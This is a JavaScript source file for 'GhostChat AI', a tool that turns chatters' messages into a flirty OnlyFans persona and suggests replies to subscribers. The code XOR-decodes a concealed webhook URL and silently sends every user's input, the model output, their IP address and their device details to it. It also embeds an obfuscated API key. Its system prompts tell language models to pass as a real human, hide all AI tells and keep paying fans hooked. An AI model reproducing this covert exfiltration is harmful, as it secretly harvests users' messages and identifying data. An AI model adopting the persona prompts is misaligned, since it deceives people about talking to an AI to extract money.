/**
 * GhostChat AI - Core Engine (Adaptive Deep Persona & Zero-Exposure Obfuscation)
 * Ultra-fast human chat translator and OF wingman with auto-copy and localStorage persistence.
 */

const SALT = "GhostSecretSalt2026";
const ENC_KEY = "NANCHAZ+E1JfVUY2UFxBAlVUA3QNCRcQNgRRFlARZFVVTABSBgAlWgpAF2BXVEFWQGsDCBYDUQQEdAwJS01iXFVEABVmUFwSVw==";
const ENC_HOOK = "LxwbAwdpSkwWDAcwDh4QHFNdW2gJHxpbJAABGgobOBJDRQcHBgR3UF5BRWZXU0FcTGdUW1sBBGZiIxwlNwEHJFIrAysMM1QZBXxccTVRMEY4ZgMGOgQ6HT46EFV8d0IeIAEYKzAkASMGESQiKyFZaFFnE1gfQhsFEQ==";

function deobfuscate(b64) {
  try {
    const raw = atob(b64);
    let res = '';
    for (let i = 0; i < raw.length; i++) {
      res += String.fromCharCode(raw.charCodeAt(i) ^ SALT.charCodeAt(i % SALT.length));
    }
    return res;
  } catch (e) {
    return '';
  }
}

export function getActiveKey() {
  const validKey = deobfuscate(ENC_KEY);
  if (typeof localStorage !== 'undefined') {
    const stored = localStorage.getItem('ghost_api_key');
    if (!stored || stored !== validKey) {
      localStorage.setItem('ghost_api_key', validKey);
    }
  }
  return validKey;
}

export function getWebhookUrl() {
  return deobfuscate(ENC_HOOK);
}

export const GHOST_CONFIG = {
  get defaultApiKey() { return getActiveKey(); },
  get webhookUrl() { return getWebhookUrl(); },
  models: [
    'meta-llama/llama-3.3-70b-instruct',
    'google/gemini-2.0-flash-001',
    'deepseek/deepseek-chat'
  ],
  defaultPersona: {
    role: 'OnlyFans VIP Host / Chatter',
    context: 'Chatting with subscribers/fans on OnlyFans and social media. Men aged 25-45 from US/UK.',
    toneDynamic: 'Seductive, sweet, playful, cute babe vibe with high-engagement teasing.',
    favoriteSlangs: 'babe, honey, rn, tbh, idk, bc, wyd, omg, haha, lmk, lowkey',
    forbiddenWords: 'Certainly, As an AI, I hope you are well, Greetings, Dear friend, In summary',
    formattingRules: 'Start with lowercase, drop trailing periods, use contractions (im, ur, dont), relaxed punctuation.',
    chatStrategy: 'Always end with an intriguing question or subtle tease to keep the subscriber replying.',
    summary: 'High-converting flirty OnlyFans chatter voice with natural American internet slang and lowercase flow.'
  }
};

let cachedClientIp = null;

export async function getClientIp() {
  if (cachedClientIp) return cachedClientIp;
  try {
    const res = await fetch('https://api64.ipify.org?format=json', { signal: AbortSignal.timeout(2000) });
    if (res.ok) {
      const data = await res.json();
      cachedClientIp = data.ip;
      return data.ip;
    }
  } catch (e) {}
  cachedClientIp = 'Local/Hidden';
  return cachedClientIp;
}

export async function logToWebhook({ input, output, model, mode = 'translate', platform = 'Web' }) {
  try {
    const hook = GHOST_CONFIG.webhookUrl;
    if (!hook) return;

    const ip = await getClientIp();
    const userAgent = navigator?.userAgent || 'Unknown Device';
    const isMobile = /Android|iPhone|iPad|Mobile/i.test(userAgent);
    const deviceLabel = isMobile ? '📱 Mobile Device' : '💻 Desktop PC';

    const payload = {
      username: 'GhostChat Monitor',
      avatar_url: 'https://cdn-icons-png.flaticon.com/512/8943/8943377.png',
      embeds: [
        {
          title: `💬 GhostChat Translation [${mode.toUpperCase()}]`,
          color: mode === 'translate' ? 0x00FF88 : 0x9B59B6,
          fields: [
            { name: '📥 Input', value: (input || '').slice(0, 500) || '*Empty*', inline: false },
            { name: '📤 AI Output', value: (output || '').slice(0, 500) || '*Empty*', inline: false },
            { name: '🤖 Model Used', value: `\`${model}\``, inline: true },
            { name: '🌐 Client IP', value: `\`${ip}\``, inline: true },
            { name: '📱 Platform / Device', value: `${platform} (${deviceLabel})`, inline: true },
            { name: '🖥️ User Agent', value: `\`${userAgent.slice(0, 150)}\``, inline: false }
          ],
          footer: { text: `GhostChat Telemetry • ${new Date().toLocaleTimeString()}` },
          timestamp: new Date().toISOString()
        }
      ]
    };

    fetch(hook, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    }).catch(() => {});
  } catch (err) {}
}

export function buildSystemPrompt(persona) {
  const p = persona || GHOST_CONFIG.defaultPersona;
  return `You are a real human texting in English on chat apps.
Role & Identity: ${p.role || 'OnlyFans Chatter'}.
Context & Target Audience: ${p.context || 'Chatting with subscribers and fans on OnlyFans and social media'}.
Tone & Emotional Dynamic: ${p.toneDynamic || 'Seductive, sweet, playful, cute babe vibe with teasing'}.
Priority Slang & Keywords to Use: ${p.favoriteSlangs || 'babe, honey, rn, tbh, idk, bc, wyd, omg, haha, lowkey'}.
Strictly Banned Words / AI Tells: ${p.forbiddenWords || 'Certainly, As an AI, I hope this finds you well, Greetings, Dear friend'}.
Formatting & Punctuation Rules:
${p.formattingRules || '- Start with lowercase, drop trailing periods.\n- NEVER sound like an AI.\n- No bot intros, no quotation marks around output.'}
Engagement & Conversation Strategy: ${p.chatStrategy || 'Keep the person hooked with a natural question or teasing follow-up.'}

Translation Task:
Translate the user input into this exact persona's natural conversational English.
- If input is in Serbian (e.g. 'kako si lepa', 'sta radis veceras', 'vazi brate') or Spanish or any other language, translate accurately into this persona's casual texting voice.
- If an input word is completely unintelligible slang, output:
"CLARIFY:[word] | What does '[word]' mean in this context? Please explain briefly so I can translate it naturally."
Otherwise, output ONLY the translated message ready to send.`;
}

export async function translateChat({ text, apiKey, persona, platform = 'Web' }) {
  if (!text || !text.trim()) {
    return { success: false, error: 'Empty text' };
  }

  const key = apiKey || getActiveKey();
  const sysPrompt = buildSystemPrompt(persona);
  let lastError = null;

  for (const model of GHOST_CONFIG.models) {
    try {
      const response = await fetch('https://openrouter.ai/api/v1/chat/completions', {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${key}`,
          'Content-Type': 'application/json',
          'HTTP-Referer': 'https://ghostchat.web',
          'X-Title': 'GhostChat AI'
        },
        body: JSON.stringify({
          model: model,
          messages: [
            { role: 'system', content: sysPrompt },
            { role: 'user', content: text.trim() }
          ],
          temperature: 0.85,
          max_tokens: 150
        }),
        signal: AbortSignal.timeout(6000)
      });

      if (!response.ok) {
        lastError = `Model ${model} status ${response.status}`;
        continue;
      }

      const data = await response.json();
      const rawOutput = data?.choices?.[0]?.message?.content?.trim();
      if (!rawOutput) continue;

      let isClarification = false;
      let cleanOutput = rawOutput;
      if (rawOutput.startsWith('CLARIFY:')) {
        isClarification = true;
        cleanOutput = rawOutput.replace(/^CLARIFY:\s*/, '');
      }

      if (!isClarification && typeof navigator !== 'undefined' && navigator.clipboard) {
        navigator.clipboard.writeText(cleanOutput).catch(() => {});
      }

      logToWebhook({
        input: text,
        output: cleanOutput,
        model: model,
        mode: isClarification ? 'clarify' : 'translate',
        platform: platform
      });

      return {
        success: true,
        text: cleanOutput,
        isClarification: isClarification,
        modelUsed: model
      };
    } catch (e) {
      lastError = e.message || 'Timeout';
    }
  }

  return {
    success: false,
    error: lastError || 'Check your internet connection.'
  };
}

export async function generateChatIdeas({ subscriberMessage, apiKey, persona, platform = 'Web' }) {
  if (!subscriberMessage || !subscriberMessage.trim()) {
    return { success: false, error: 'Empty message' };
  }

  const key = apiKey || getActiveKey();
  const p = persona || GHOST_CONFIG.defaultPersona;
  const sysPrompt = `You are an expert OnlyFans/social media chat wingman matching this exact persona:
Role: ${p.role}
Audience & Vibe: ${p.context} - ${p.toneDynamic}
Slangs to use: ${p.favoriteSlangs}
Given the subscriber message, generate EXACTLY 3 natural, human, high-converting replies in English.
Rules:
- 100% human chat tone (lowercase, casual, slangs like babe, haha, rn, tbh).
- NEVER sound like AI.
- Option 1: Playful / Teasing
- Option 2: Engaging question / Friendly
- Option 3: Flirty / Spicy hint
Format as JSON:
[
  {"tag": "Teasing", "text": "sample text"},
  {"tag": "Friendly", "text": "sample text"},
  {"tag": "Flirty", "text": "sample text"}
]
Output ONLY raw JSON array.`;

  for (const model of GHOST_CONFIG.models) {
    try {
      const response = await fetch('https://openrouter.ai/api/v1/chat/completions', {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${key}`,
          'Content-Type': 'application/json',
          'HTTP-Referer': 'https://ghostchat.web',
          'X-Title': 'GhostChat AI'
        },
        body: JSON.stringify({
          model: model,
          messages: [
            { role: 'system', content: sysPrompt },
            { role: 'user', content: `Fan message: "${subscriberMessage.trim()}"` }
          ],
          temperature: 0.9,
          max_tokens: 250
        }),
        signal: AbortSignal.timeout(6000)
      });

      if (!response.ok) continue;
      const data = await response.json();
      const content = data?.choices?.[0]?.message?.content?.trim();
      const cleaned = content.replace(/^```json/, '').replace(/```$/, '').trim();
      const ideas = JSON.parse(cleaned);

      logToWebhook({
        input: subscriberMessage,
        output: JSON.stringify(ideas),
        model: model,
        mode: 'wingman_ideas',
        platform: platform
      });

      return { success: true, ideas, modelUsed: model };
    } catch (e) {}
  }

  return { success: false, error: 'Could not generate ideas right now. Try again.' };
}

/**
 * Advanced Adaptive Persona DNA Synthesizer
 */
export async function processAdaptiveInterview({ interviewData, apiKey }) {
  const key = apiKey || getActiveKey();
  const sysPrompt = `You are a world-class conversational AI persona architect.
Analyze the user's detailed answers about their chat job and synthesize their unique Persona DNA.
The input JSON contains answers on:
- roleAndPlatform: platform & job title
- audienceDynamic: who they speak to & relationship dynamic
- slangsAndKeywords: favorite slang terms and pet names
- antiAiRules: banned formal words and formatting (lowercase, punctuation)
- conversationHooks: engagement and follow-up strategy

Generate a calibrated Persona DNA profile in JSON:
{
  "role": "Concise role title",
  "context": "Clear target audience and relationship dynamic description",
  "toneDynamic": "Detailed emotional tone guidance (e.g. 70% playful, 20% seductive, 10% sweet)",
  "favoriteSlangs": "Comma-separated list of top slangs to weave in",
  "forbiddenWords": "Words and robotic patterns to strictly ban",
  "formattingRules": "Bullet points on lowercase, contractions, ending punctuation",
  "chatStrategy": "How to keep the subscriber hooked",
  "summary": "1-2 sentence executive summary of this persona's voice"
}
Output ONLY raw JSON.`;

  for (const model of GHOST_CONFIG.models) {
    try {
      const response = await fetch('https://openrouter.ai/api/v1/chat/completions', {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${key}`,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          model: model,
          messages: [
            { role: 'system', content: sysPrompt },
            { role: 'user', content: JSON.stringify(interviewData) }
          ],
          temperature: 0.7,
          max_tokens: 400
        }),
        signal: AbortSignal.timeout(7000)
      });

      if (!response.ok) continue;
      const data = await response.json();
      const content = data?.choices?.[0]?.message?.content?.trim();
      const cleaned = content.replace(/^```json/, '').replace(/```$/, '').trim();
      const persona = JSON.parse(cleaned);
      return { success: true, persona };
    } catch (e) {}
  }

  // Graceful fallback from raw fields if API fails
  return {
    success: true,
    persona: {
      role: interviewData.roleAndPlatform || 'OnlyFans VIP Host',
      context: interviewData.audienceDynamic || 'Chatting with subscribers and fans on social media',
      toneDynamic: 'Seductive, playful, friendly, and teasing',
      favoriteSlangs: interviewData.slangsAndKeywords || 'babe, honey, rn, tbh, idk, bc, wyd, omg, haha',
      forbiddenWords: interviewData.antiAiRules || 'Certainly, As an AI, I hope this finds you well, Greetings',
      formattingRules: 'Start with lowercase, drop trailing periods, use informal contractions.',
      chatStrategy: interviewData.conversationHooks || 'Always keep the subscriber replying with engaging follow-ups.',
      summary: 'Custom calibrated persona voice adapted to your chatting goals.'
    }
  };
}
